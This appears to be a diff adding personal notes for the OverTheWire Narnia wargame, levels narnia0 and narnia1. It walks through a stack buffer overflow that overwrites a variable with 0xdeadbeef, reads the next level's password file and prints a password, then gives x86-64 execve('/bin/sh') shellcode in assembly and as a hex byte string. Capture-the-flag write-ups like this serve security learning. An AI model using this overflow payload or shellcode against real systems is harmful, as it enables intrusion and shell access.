@@ -1,0 +1,39 @@
+narnia0
+- Let's go to the problem
+	- cd /narnia
+- We see two programs about narnia0
+- Let's look at the c program
+	- cat narnia0.c
+- It looks like the buffer is 20 bytes long. We can overflow this by inputting more than 20 characters
+- Let's input 'AAAAAAAAAAAAAAAAAAAABBBB' and see if it changes val
+- Indeed it does, now we need to change BBBB to the ascii value of deadbeef
+- Since this is little endian, we need to find 0\xef0\xbe0\xad0\xad0\xde in ascii
+- I made a simple shell script (in /tmp/deadbeeffun)
+
+	#!/bin/bash
+
+	echo -e 'aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde\xaa'
+
+*This will not work without a character at the end for some reason. No idea why this occurs. Only works with some characters too. 
+- Let's input it in the ./narnia0 program
+- cat /etc/narnia_pass/narnia1
+Password: efeidiedae
+
+narnia1
+.section .text
+.globl _start
+_start:
+
+xor %rdx, %rdx
+movq $0x68732f6e69622fff, %rbx
+shr $0x8, %rbx
+push %rbx
+movq %rsp, %rdi
+xorq %rax, %rax
+pushq %rax
+pushq %rdi
+movq %rsp, %rsi
+mov $0x3b, %al
+syscall
+
+\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05
